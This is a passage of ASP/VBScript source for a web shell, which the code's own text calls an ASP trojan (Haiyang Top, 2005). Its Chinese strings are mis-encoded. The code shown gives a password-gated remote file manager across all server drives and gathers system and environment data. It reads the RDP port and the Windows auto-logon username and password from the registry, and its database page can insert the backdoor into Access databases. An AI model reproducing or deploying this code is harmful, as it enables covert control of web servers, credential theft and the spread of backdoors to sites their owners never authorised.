           echo &quot;&lt;input size=60 value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot; name=thePath>&quot;
           echo &quot;&lt;input type=submit value=' ×ªµ½ '>&quot;
           driveStr = &quot;&lt;option>ÅÌ·û&lt;/option>&quot;
           driveStr = driveStr & &quot;&lt;option value='&quot; & HtmlEncode(Server.MapPath(&quot;.&quot;)) & &quot;'>.&lt;/option>&quot;
           driveStr = driveStr & &quot;&lt;option value='&quot; & HtmlEncode(Server.MapPath(&quot;/&quot;)) & &quot;'>/&lt;/option>&quot;
           For Each drive In fso.Drives
               driveStr = driveStr & &quot;&lt;option value='&quot; & drive.DriveLetter & &quot;:\'>&quot; & drive.DriveLetter & &quot;:\&lt;/option>&quot;
           Next
           echo &quot;&lt;input type=button value=' Ë¢ÐÂ ' onclick='location.reload();'> &quot;
           echo &quot;&lt;select onchange=&quot;&quot;this.form.thePath.value=this.value;this.form.submit();&quot;&quot;>&quot; & driveStr & &quot;&lt;/select>&quot;
           echo &quot;&lt;hr/>&lt;/form>&quot;
           echo &quot;&lt;/div>&lt;div style='height:50px;'>&lt;/div>&quot;
           echo &quot;&lt;script>fixTheLayer('fileExplorerTools');setInterval(&quot;&quot;fixTheLayer('fileExplorerTools');&quot;&quot;, 200);&lt;/script>&quot;
           If fso.FolderExists(thePath) = False Then
               showErr(thePath & &quot; Ä¿Â¼²»´æÔÚ»òÕß²»ÔÊÐí·ÃÎÊ!&quot;)
           End If
           Set theFolder = fso.GetFolder(thePath)
           Set theFiles = theFolder.Files
           Set theFolders = theFolder.SubFolders
           echo &quot;&lt;div id=FileList>&quot;
           For Each folder In theFolders
               i = i + 1
               If i > 50 Then
                   i = 0
                   Response.Flush()
               End If
               strTmp = UrlEncode(folder.Path & &quot;\&quot;)
               echo &quot;&lt;span id='&quot; & strTmp & &quot;' onDblClick=&quot;&quot;changeThePath(this);&quot;&quot; onclick=changeMyClass(this);>&lt;font class=font face=Wingdings>0&lt;/font>&lt;br/>&quot; & folder.Name & &quot;&lt;/span>&quot; & vbNewLine
           Next
           Response.Flush()
           For Each file In theFiles
               i = i + 1
               If i > 100 Then
                   i = 0
                   Response.Flush()
               End If
               echo &quot;&lt;span id='&quot; & UrlEncode(file.Path) & &quot;' title='ÀàÐÍ: &quot; & file.Type & vbNewLine & &quot;´óÐ¡: &quot; & getTheSize(file.Size) & &quot;' onDblClick=&quot;&quot;openUrl();&quot;&quot; onclick=changeMyClass(this);>&lt;font class=font face=&quot; & getFileIcon(fso.GetExtensionName(file.Name)) & &quot;&lt;/font>&lt;br/>&quot; & file.Name & &quot;&lt;/span>&quot; & vbNewLine
           Next
           echo &quot;&lt;/div>&quot;
           chkErr(Err)

           echo &quot;&lt;hr/>Powered By Marcos 2005.02&quot;
       End Sub

       Sub fsoNewOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theAct, isFile, theName, newAct
           isFile = Request(&quot;isFile&quot;)
           newAct = Request(&quot;newAct&quot;)
           theName = Request(&quot;theName&quot;)
           If newAct = &quot; È·¶¨ &quot; Then
               thePath = Replace(thePath & &quot;\&quot; & theName, &quot;\\&quot;, &quot;\&quot;)
               If isFile = &quot;True&quot; Then
                   Call fso.CreateTextFile(thePath, False)
                Else
                   fso.CreateFolder(thePath)
               End If
               chkErr(Err)
               alertThenClose(&quot;ÎÄ¼þ(¼Ð)ÐÂ½¨³É¹¦,Ë¢ÐÂºó¾Í¿ÉÒÔ¿´µ½Ð§¹û!&quot;)
               Response.End
           End If

           echo &quot;&lt;style>body{overflow:hidden;}&lt;/style>&quot;
           echo &quot;&lt;body topmargin=2>&quot;
           echo &quot;&lt;form method=post>&quot;
           echo &quot;&lt;input type=hidden name=thePath value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot;>&lt;br/>ÐÂ½¨: &quot;
           echo &quot;&lt;input type=radio name=isFile id=file value='True' checked>&lt;label for=file>ÎÄ¼þ&lt;/label> &quot;
           echo &quot;&lt;input type=radio name=isFile id=folder value='False'>&lt;label for=folder>ÎÄ¼þ¼Ð&lt;/label>&lt;br/>&quot;
           echo &quot;&lt;input size=38 name=theName>&lt;hr/>&quot;
           echo &quot;&lt;input type=hidden name=theAct value=doNewOne>&quot;
           echo &quot;&lt;input type=submit name=newAct value=' È·¶¨ '>&quot; & strJsCloseMe
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;/body>&lt;br/>&quot;
       End Sub

       Sub fsoPastOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim sessionPath
           sessionPath = Session(m & &quot;fsoThePath&quot;)

           If thePath = &quot;&quot; Or sessionPath = &quot;&quot; Then
               alertThenClose(&quot;²ÎÊý´íÎó!&quot;)
               Response.End
           End If

           If Right(thePath, 1) = &quot;\&quot; Then
               thePath = Left(thePath, Len(thePath) - 1)
           End If

           If Right(sessionPath, 1) = &quot;\&quot; Then
               sessionPath = Left(sessionPath, Len(sessionPath) - 1)
               If Session(m & &quot;fsoTheAct&quot;) = &quot;cutOne&quot; Then
                   Call fso.MoveFolder(sessionPath, thePath & &quot;\&quot; & fso.GetFileName(sessionPath))
                Else
                   Call fso.CopyFolder(sessionPath, thePath & &quot;\&quot; & fso.GetFileName(sessionPath))
               End If
            Else
               If Session(m & &quot;fsoTheAct&quot;) = &quot;cutOne&quot; Then
                   Call fso.MoveFile(sessionPath, thePath & &quot;\&quot; & fso.GetFileName(sessionPath))
                Else
                   Call fso.CopyFile(sessionPath, thePath & &quot;\&quot; & fso.GetFileName(sessionPath))
               End If
           End If

           chkErr(Err)
       End Sub

       Sub fsoRename(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, fileName, theFolder
           fileName = Request(&quot;fileName&quot;)

           If thePath = &quot;&quot; Or fileName = &quot;&quot; Then
               alertThenClose(&quot;²ÎÊý´íÎó!&quot;)
               Response.End
           End If
           If Right(thePath, 1) = &quot;\&quot; Then
               Set theFolder = fso.GetFolder(thePath)
               theFolder.Name = fileName
               Set theFolder = Nothing
            Else
               Set theFile = fso.GetFile(thePath)
               theFile.Name = fileName
               Set theFile = Nothing
           End If

           chkErr(Err)
       End Sub

       Sub showFsoRename(thePath)
           Dim theAct, fileName
           fileName = fso.getFileName(thePath)

           echo &quot;&lt;style>body{overflow:hidden;}&lt;/style>&quot;
           echo &quot;&lt;body topmargin=2>&quot;
           echo &quot;&lt;form method=post>&quot;
           echo &quot;&lt;input type=hidden name=thePath value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot;>&lt;br/>¸üÃûÎª:&lt;br/>&quot;
           echo &quot;&lt;input size=38 name=fileName value=&quot;&quot;&quot; & HtmlEncode(fileName) & &quot;&quot;&quot;>&lt;hr/>&quot;
           echo &quot;&lt;input type=submit value=' È·¶¨ '>&quot;
           echo &quot;&lt;input type=hidden name=theAct value=doRename>&quot;
           echo &quot;&lt;input type=button value=' ¹Ø±Õ ' onclick='window.close();'>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;/body>&lt;br/>&quot;
       End Sub

       Sub showFsoDelOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim newAct, theFile
           newAct = Request(&quot;newAct&quot;)
           If newAct = &quot;È·ÈÏÉ¾³ý?&quot; Then
               If Right(thePath, 1) = &quot;\&quot; Then
                   thePath = Left(thePath, Len(thePath) - 1)
                   Call fso.DeleteFolder(thePath, True)
                Else
                   Call fso.DeleteFile(thePath, True)
               End If
               chkErr(Err)
               alertThenClose(&quot;ÎÄ¼þ(¼Ð)É¾³ý³É¹¦,Ë¢ÐÂºó¾Í¿ÉÒÔ¿´µ½Ð§¹û!&quot;)
               Response.End
           End If
           echo &quot;&lt;style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}&lt;/style>&quot;
           echo &quot;&lt;form method=post>&lt;br/>&quot;
           echo HtmlEncode(thePath)
           echo &quot;&lt;input type=hidden name=thePath value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot;>&quot;
           echo &quot;&lt;input type=hidden name=theAct value=doDelOne>&quot;
           echo &quot;&lt;hr/>&lt;input type=submit name=newAct value='È·ÈÏÉ¾³ý?'>&lt;input type=button value=' ¹Ø±Õ ' onclick='window.close();'>&quot;
           echo &quot;&lt;/form>&quot;
       End Sub

       Sub fsoTheAttributes(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim newAct, theFile, theFolder, theTitle
           newAct = Request(&quot;newAct&quot;)

           If Right(thePath, 1) = &quot;\&quot; Then
               Set theFolder = fso.GetFolder(thePath)
               If newAct = &quot; ÐÞ¸Ä &quot; Then
                   setMyTitle(theFolder)
               End If
                   theTitle = getMyTitle(theFolder)
               Set theFolder = Nothing
            Else
               Set theFile = fso.GetFile(thePath)
               If newAct = &quot; ÐÞ¸Ä &quot; Then
                   setMyTitle(theFile)
               End If
               theTitle = getMyTitle(theFile)
               Set theFile = Nothing
           End If

           chkErr(Err)
           theTitle = Replace(theTitle, vbNewLine, &quot;&lt;br/>&quot;)
           echo &quot;&lt;style>body{margin:8;overflow:hidden;}&lt;/style>&quot;
           echo &quot;&lt;form method=post>&quot;
           echo &quot;&lt;input type=hidden name=thePath value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot;>&quot;
           echo &quot;&lt;input type=hidden name=theAct value=doModifyAttributes>&quot;
           echo theTitle
           echo &quot;&lt;hr/>&lt;input type=submit name=newAct value=' ÐÞ¸Ä '>&quot; & strJsCloseMe
           echo &quot;&lt;/form>&quot;
       End Sub

       Function getMyTitle(theOne)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strTitle
           strTitle = strTitle & &quot;Â·¾¶: &quot;&quot; & theOne.Path & &quot;&quot;&quot; & vbNewLine
           strTitle = strTitle & &quot;´óÐ¡: &quot; & getTheSize(theOne.Size) & vbNewLine
           strTitle = strTitle & &quot;ÊôÐÔ: &quot; & getAttributes(theOne.Attributes) & vbNewLine
           strTitle = strTitle & &quot;´´½¨Ê±¼ä: &quot; & theOne.DateCreated & vbNewLine
           strTitle = strTitle & &quot;×îºóÐÞ¸Ä: &quot; & theOne.DateLastModified & vbNewLine
           strTitle = strTitle & &quot;×îºó·ÃÎÊ: &quot; & theOne.DateLastAccessed
           getMyTitle = strTitle
       End Function

       Sub setMyTitle(theOne)
           Dim i, myAttributes

           For i = 1 To Request(&quot;attributes&quot;).Count
               myAttributes = myAttributes + CInt(Request(&quot;attributes&quot;)(i))
           Next
           theOne.Attributes = myAttributes

           chkErr(Err)
           echo  &quot;&lt;script>alert('¸ÃÎÄ¼þ(¼Ð)ÊôÐÔÒÑ°´ÕýÈ·ÉèÖÃÐÞ¸ÄÍê³É!');&lt;/script>&quot;
       End Sub

       Function getAttributes(intValue)
           Dim strAtt
           strAtt = &quot;&lt;input type=checkbox name=attributes value=4 {$system}>ÏµÍ³ &quot;
           strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes value=2 {$hidden}>Òþ²Ø &quot;
           strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes value=1 {$readonly}>Ö»¶Á&nbsp;&nbsp;&nbsp;&quot;
           strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes value=32 {$archive}>´æµµ&lt;br/>¡¡¡¡&nbsp; &quot;
           strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes {$normal} value=0>ÆÕÍ¨ &quot;
           strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes value=128 {$compressed}>Ñ¹Ëõ &quot;
           strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes value=16 {$directory}>ÎÄ¼þ¼Ð&nbsp;&quot;
           strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes value=64 {$alias}>¿ì½Ý·½Ê½&quot;
   '       strAtt = strAtt & &quot;&lt;input type=checkbox name=attributes value=8 {$volume}>¾í±ê &quot;
           If intValue = 0 Then
               strAtt = Replace(strAtt, &quot;{$normal}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 128 Then
               intValue = intValue - 128
               strAtt = Replace(strAtt, &quot;{$compressed}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 64 Then
               intValue = intValue - 64
               strAtt = Replace(strAtt, &quot;{$alias}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 32 Then
               intValue = intValue - 32
               strAtt = Replace(strAtt, &quot;{$archive}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 16 Then
               intValue = intValue - 16
               strAtt = Replace(strAtt, &quot;{$directory}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 8 Then
               intValue = intValue - 8
               strAtt = Replace(strAtt, &quot;{$volume}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 4 Then
               intValue = intValue - 4
               strAtt = Replace(strAtt, &quot;{$system}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 2 Then
               intValue = intValue - 2
               strAtt = Replace(strAtt, &quot;{$hidden}&quot;, &quot;checked&quot;)
           End If
           If intValue >= 1 Then
               intValue = intValue - 1
               strAtt = Replace(strAtt, &quot;{$readonly}&quot;, &quot;checked&quot;)
           End If
           getAttributes = strAtt
       End Function
       Sub PageInfoAboutSrv()
           Dim theAct
           theAct = Request(&quot;theAct&quot;)

           showTitle(&quot;·þÎñÆ÷Ïà¹ØÊý¾Ý&quot;)

           Select Case theAct
               Case &quot;&quot;
                   getSrvInfo()
                   getSrvDrvInfo()
                   getSiteRootInfo()
                   getTerminalInfo()
               Case &quot;getSrvInfo&quot;
                   getSrvInfo()
               Case &quot;getSrvDrvInfo&quot;
                   getSrvDrvInfo()
               Case &quot;getSiteRootInfo&quot;
                   getSiteRootInfo()
               Case &quot;getTerminalInfo&quot;
                   getTerminalInfo()
           End Select

           echo &quot;&lt;hr/>Powered By Marcos 2005.02&quot;
       End Sub
       Sub getSrvInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
           Set sa = Server.CreateObject(&quot;Shell.Application&quot;)
           strExEnvList = &quot;SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$&quot; & _
                          &quot;PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION&quot;
           aryExEnvList = Split(strExEnvList, &quot;$&quot;)

           Set objWshSysEnv = ws.Environment(&quot;SYSTEM&quot;)
           chkErr(Err)
           intCpuNum = Request.ServerVariables(&quot;NUMBER_OF_PROCESSORS&quot;)
           If IsNull(intCpuNum) Or intCpuNum = &quot;&quot; Then
               intCpuNum = objWshSysEnv(&quot;NUMBER_OF_PROCESSORS&quot;)
           End If
           strOS = Request.ServerVariables(&quot;OS&quot;)
           If IsNull(strOS) Or strOS = &quot;&quot; Then
               strOS = objWshSysEnv(&quot;OS&quot;)
               strOs = strOs & &quot;(ÓÐ¿ÉÄÜÊÇ Windows2003 Å¶)&quot;
           End If
           strCpuInfo = objWshSysEnv(&quot;PROCESSOR_IDENTIFIER&quot;)
           echo &quot;&lt;a href=javascript:showHideMe(srvInf);>·þÎñÆ÷Ïà¹Ø²ÎÊý:&lt;/a>&quot;
           echo &quot;&lt;ol id=srvInf>&lt;hr/>&quot;
           echo &quot;&lt;li>·þÎñÆ÷Ãû: &quot; & Request.ServerVariables(&quot;SERVER_NAME&quot;) & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷IP: &quot; & Request.ServerVariables(&quot;LOCAL_ADDR&quot;) & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñ¶Ë¿Ú: &quot; & Request.ServerVariables(&quot;SERVER_PORT&quot;) & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷ÄÚ´æ: &quot; & getTheSize(sa.GetSystemInformation(&quot;PhysicalMemoryInstalled&quot;)) & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷Ê±¼ä: &quot; & Now & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷Èí¼þ: &quot; & Request.ServerVariables(&quot;SERVER_SOFTWARE&quot;) & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>½Å±¾³¬Ê±Ê±¼ä: &quot; & Server.ScriptTimeout & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷CPUÊýÁ¿: &quot; & intCpuNum & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷CPUÏêÇé: &quot; & strCpuInfo & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷²Ù×÷ÏµÍ³: &quot; & strOS & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>·þÎñÆ÷½âÒëÒýÇæ: &quot; & ScriptEngine & &quot;/&quot; & ScriptEngineMajorVersion & &quot;.&quot; & ScriptEngineMinorVersion & &quot;.&quot; & ScriptEngineBuildVersion & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>±¾ÎÄ¼þÊµ¼ÊÂ·¾¶: &quot; & Request.ServerVariables(&quot;PATH_TRANSLATED&quot;) & &quot;&lt;/li>&quot;
           echo &quot;&lt;hr/>&lt;/ol>&quot;

           echo &quot;&lt;br/>&lt;a href=javascript:showHideMe(srvEnvInf);>·þÎñÆ÷Ïà¹Ø²ÎÊý:&lt;/a>&quot;
           echo &quot;&lt;ol id=srvEnvInf>&lt;hr/>&quot;
           For i = 0 To UBound(aryExEnvList)
               echo &quot;&lt;li>&quot; & aryExEnvList(i) & &quot;: &quot; & ws.ExpandEnvironmentStrings(&quot;%&quot; & aryExEnvList(i) & &quot;%&quot;) & &quot;&lt;/li>&quot;
           Next
           echo &quot;&lt;hr/>&lt;/ol>&quot;

           Set sa = Nothing
           Set objWshSysEnv = Nothing
       End Sub
       Sub getSrvDrvInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim objTheDrive
           echo &quot;&lt;br/>&lt;a href=javascript:showHideMe(srvDriveInf);>·þÎñÆ÷´ÅÅÌÐÅÏ¢:&lt;/a>&quot;
           echo &quot;&lt;ol id=srvDriveInf>&lt;hr/>&quot;
           echo &quot;&lt;div id='fsoDriveList'>&quot;
           echo &quot;&lt;span>ÅÌ·û&lt;/span>&lt;span>ÀàÐÍ&lt;/span>&lt;span>¾í±ê&lt;/span>&lt;span>ÎÄ¼þÏµÍ³&lt;/span>&lt;span>¿ÉÓÃ¿Õ¼ä&lt;/span>&lt;span>×Ü¿Õ¼ä&lt;/span>&lt;br/>&quot;
           For Each objTheDrive In fso.Drives
               echo &quot;&lt;span>&quot; & objTheDrive.DriveLetter & &quot;&lt;/span>&quot;
               echo &quot;&lt;span>&quot; & getDriveType(objTheDrive.DriveType) & &quot;&lt;/span>&quot;
               If UCase(objTheDrive.DriveLetter) = &quot;A&quot; Then
                   echo &quot;&lt;br/>&quot;
                Else
                   echo &quot;&lt;span>&quot; & objTheDrive.VolumeName & &quot;&lt;/span>&quot;
                   echo &quot;&lt;span>&quot; & objTheDrive.FileSystem & &quot;&lt;/span>&quot;
                   echo &quot;&lt;span>&quot; & getTheSize(objTheDrive.FreeSpace) & &quot;&lt;/span>&quot;
                   echo &quot;&lt;span>&quot; & getTheSize(objTheDrive.TotalSize) & &quot;&lt;/span>&lt;br/>&quot;
               End If
               If Err Then
                   Err.Clear
                   echo &quot;&lt;br/>&quot;
               End If
           Next
           echo &quot;&lt;/div>&lt;hr/>&lt;/ol>&quot;
           Set objTheDrive = Nothing
       End Sub

       Sub getSiteRootInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim objTheFolder
           Set objTheFolder = fso.GetFolder(Server.MapPath(&quot;/&quot;))
           echo &quot;&lt;br/>&lt;a href=javascript:showHideMe(siteRootInfo);>Õ¾µã¸ùÄ¿Â¼ÐÅÏ¢:&lt;/a>&quot;
           echo &quot;&lt;ol id=siteRootInfo>&lt;hr/>&quot;
           echo &quot;&lt;li>ÎïÀíÂ·¾¶: &quot; & Server.MapPath(&quot;/&quot;) & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>µ±Ç°´óÐ¡: &quot; & getTheSize(objTheFolder.Size) & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>ÎÄ¼þÊý: &quot; & objTheFolder.Files.Count & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>ÎÄ¼þ¼ÐÊý: &quot; & objTheFolder.SubFolders.Count & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>´´½¨ÈÕÆÚ: &quot; & objTheFolder.DateCreated & &quot;&lt;/li>&quot;
           echo &quot;&lt;li>×îºó·ÃÎÊÈÕÆÚ: &quot; & objTheFolder.DateLastAccessed & &quot;&lt;/li>&quot;
           echo &quot;&lt;/ol>&quot;
       End Sub

       Sub getTerminalInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim terminalPortPath, terminalPortKey, termPort
           Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
           Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
           terminalPortPath = &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot;
           terminalPortKey = &quot;PortNumber&quot;
           termPort = ws.RegRead(terminalPortPath & terminalPortKey)
           echo &quot;ÖÕ¶Ë·þÎñ¶Ë¿Ú¼°×Ô¶¯µÇÂ¼ÐÅÏ¢&lt;hr/>&lt;ol>&quot;
           If termPort = &quot;&quot; Or Err.Number &lt;> 0 Then
               echo  &quot;ÎÞ·¨µÃµ½ÖÕ¶Ë·þÎñ¶Ë¿Ú, Çë¼ì²éÈ¨ÏÞÊÇ·ñÒÑ¾ÊÜµ½ÏÞÖÆ.&lt;br/>&quot;
            Else
               echo  &quot;µ±Ç°ÖÕ¶Ë·þÎñ¶Ë¿Ú: &quot; & termPort & &quot;&lt;br/>&quot;
           End If

           autoLoginPath = &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot;
           autoLoginEnableKey = &quot;AutoAdminLogon&quot;
           autoLoginUserKey = &quot;DefaultUserName&quot;
           autoLoginPassKey = &quot;DefaultPassword&quot;
           isAutoLoginEnable = ws.RegRead(autoLoginPath & autoLoginEnableKey)
           If isAutoLoginEnable = 0 Then
               echo  &quot;ÏµÍ³×Ô¶¯µÇÂ¼¹¦ÄÜÎ´¿ªÆô&lt;br/>&quot;
           Else
               autoLoginUsername = ws.RegRead(autoLoginPath & autoLoginUserKey)
               echo  &quot;×Ô¶¯µÇÂ¼µÄÏµÍ³ÕÊ»§: &quot; & autoLoginUsername & &quot;&lt;br>&quot;
               autoLoginPassword = ws.RegRead(autoLoginPath & autoLoginPassKey)
               If Err Then
                   Err.Clear
                   echo  &quot;False&quot;
               End If
               echo  &quot;×Ô¶¯µÇÂ¼µÄÕÊ»§ÃÜÂë: &quot; & autoLoginPassword & &quot;&lt;br>&quot;
           End If
           echo &quot;&lt;/ol>&quot;
       End Sub
       Sub PageLogin()
           Dim theAct, passWord
           theAct = Request(&quot;theAct&quot;)
           passWord = Request(&quot;userPassword&quot;)

           showTitle(&quot;¹ÜÀíµÇÂ¼&quot;)

           If theAct = &quot;chkLogin&quot; Then
               If passWord = userPassword Then
                   Session(m & &quot;userPassword&quot;) = passWord
                   redirectTo(&quot;?pageName=PageList&quot;)
                Else
                   echo &quot;&lt;script language=javascript>alert('°¡Å¶,µÇÂ¼Ê§°ÜÁË...');history.back();&lt;/script>&quot;
               End If
           End If

           echo &quot;&lt;style>body{margin:8;text-align:center;}&lt;/style>&quot;
           echo &quot;º£Ñô¶¥¶ËÍøASPÄ¾Âí@2006¦Á&lt;hr/>&quot;
           echo &quot;&lt;body onload=document.forms[0].userPassword.focus();>&quot;
           echo &quot;&lt;form method=post onsubmit=this.Submit.disabled=true;>&quot;
           echo &quot;&lt;input name=userPassword class=input type=password size=30> &quot;
           echo &quot;&lt;input type=hidden name=theAct value=chkLogin>&quot;
           echo &quot;&lt;input type=submit name=Submit value=&quot;&quot;&quot; & HtmlEncode(myName) & &quot;&quot;&quot; class=input>&quot;
           echo &quot;&lt;hr/>&quot;
           echo &quot;±¾°æ¸ÐÐ»: Kevin,×¢²á±í¸÷¼üÖµµÄÊÕ¼¯¹¤×÷&quot;
           echo &quot;&lt;br/>WWW.HAIYANGTOP.NET,WWW.HIDIDI.NET 2005.02&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;body>&quot;
       End Sub
       Sub pageMsDataBase()
           Dim theAct, sqlStr
           theAct = Request(&quot;theAct&quot;)
           sqlStr = Request(&quot;sqlStr&quot;)

           showTitle(&quot;mdb+mssqlÊý¾Ý¿â²Ù×÷Ò³&quot;)

           If sqlStr = &quot;&quot; Then
               If Session(m & &quot;sqlStr&quot;) = &quot;&quot; Then
                   sqlStr = &quot;e:\hytop.mdb»òsql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;&quot;
                Else
                   sqlStr = Session(m & &quot;sqlStr&quot;)
               End If
           End If
           Session(m & &quot;sqlStr&quot;) = sqlStr

           echo &quot;&lt;style>body{margin:8;}&lt;/style>&quot;
           echo &quot;&lt;form method=post action='?pageName=MsDataBase&theAct=showTables' onSubmit='this.Submit.disabled=true;'>&quot;
           echo &quot;&lt;a href='?pageName=MsDataBase'>mdb+mssqlÊý¾Ý¿â²Ù×÷&lt;/a>&lt;br/>&quot;
           echo &quot;&lt;input name=sqlStr type=text id=sqlStr value=&quot;&quot;&quot; & sqlStr & &quot;&quot;&quot; size=60 style='width:80%;'>&quot;
           echo &quot;&lt;input name=theAct type=hidden value=showTables>&lt;br/>&quot;
           echo &quot;&lt;input type=Submit name=Submit value=' Ìá½» '>&quot;
           echo &quot;&lt;input type=button name=Submit2 value=' ²åÈë ' onclick=&quot;&quot;if(confirm('ÕâÀïÊÇÔÚACESSÊý¾ÝÀï²åÈëº£Ñô¶¥¶ËÍøASPºóÃÅ\nÄ¬ÈÏÃÜÂëÊÇ&quot; & clientPassword & &quot;\nºóÃÅ²åÈëºó¿ÉÒÔÊ¹ÓÃµÄÇ°ÌáÊÇ\nÊý¾Ý¿âÊÇaspºó×º, ²¢ÇÒÃ»ÓÐ´íÂÒasp´úÂë\nÈ·ÈÏ²Ù×÷Âð?')){location.href='?pageName=MsDataBase&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}&quot;&quot;>&quot;
           echo &quot;&lt;input type=button value=' Ê¾Àý ' onclick=&quot;&quot;this.form.sqlStr.value='e:\\HYTop.mdb»òsql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';&quot;&quot;>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;hr/>×¢: ²åÈëÖ»Õë¶ÔACCESS²Ù×÷, Òªä¯ÀÀACCESSÔÚ±íµ¥ÖÐµÄÐ´·¨ÊÇ&quot;&quot;d:\bbs.mdb&quot;&quot;, SQL¾Ý¿âÐ´·¨ÊÇ&quot;&quot;sql:Á¬½Ó×Ö·û´®&quot;&quot;, ²»ÒªÍüÐ´sql:¡£&lt;hr/>&quot;
           Select Case theAct
               Case &quot;showTables&quot;
                   showTables()
               Case &quot;query&quot;
                   showQuery()
               Case &quot;inject&quot;
                   accessInject()
           End Select

           echo &quot;Powered By Marcos 2005.02&quot;
       End Sub

       Sub showTables()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
           sqlStr = Request(&quot;sqlStr&quot;)
           If LCase(Left(sqlStr, 4)) = &quot;sql:&quot; Then
               connStr = Mid(sqlStr, 5)
            Else
               connStr = &quot;Provider=Microsoft.Jet.Oledb.4.0;Data Source=&quot; & sqlStr
           End If
           Set conn = Server.CreateObject(&quot;Adodb.Connection&quot;)

           conn.Open connStr
           chkErr(Err)

           tablesStr = getTableList(conn, sqlStr, rsTable)

           echo &quot;&lt;a href=&quot;&quot;?pageName=MsDataBase&theAct=showTables&sqlStr=&quot; & UrlEncode(sqlStr)  & &quot;&quot;&quot;>Êý¾Ý¿â±í½á¹¹²é¿´:&lt;/a>&lt;br/>&quot;
           echo tablesStr & &quot;&lt;hr/>&quot;
           echo &quot;&lt;a href=&quot;&quot;?pageName=MsDataBase&theAct=query&sqlStr=&quot; & UrlEncode(sqlStr) & &quot;&quot;&quot;>×ªµ½SQLÃüÁîÖ´ÐÐ&lt;/a>&lt;hr/>&quot;
           Do Until rsTable.Eof
               Set rsColumn = conn.OpenSchema(4, Array(Empty, Empty, rsTable(&quot;Table_Name&quot;).value))
               echo &quot;&lt;table border=0 cellpadding=0 cellspacing=0>&lt;tr>&lt;td height=22 colspan=6>&lt;b>&quot; & rsTable(&quot;Table_Name&quot;) & &quot;&lt;/b>&lt;/td>&quot;
               echo &quot;&lt;/tr>&lt;tr>&lt;td colspan=6>&lt;hr/>&lt;/td>&lt;/tr>&lt;tr align=center>&quot;
               echo &quot;&lt;td>×Ö¶ÎÃû&lt;/td>&lt;td>ÀàÐÍ&lt;/td>&lt;td>´óÐ¡&lt;/td>&lt;td>¾«¶È&lt;/td>&lt;td>ÔÊÐíÎª¿Õ&lt;/td>&lt;td>Ä¬ÈÏÖµ&lt;/td>&lt;/tr>&quot;
               echo &quot;&lt;tr>&lt;td colspan=6>&lt;hr/>&lt;/td>&lt;/tr>&quot;
               Do Until rsColumn.Eof
                   echo &quot;&lt;tr align=center>&quot;
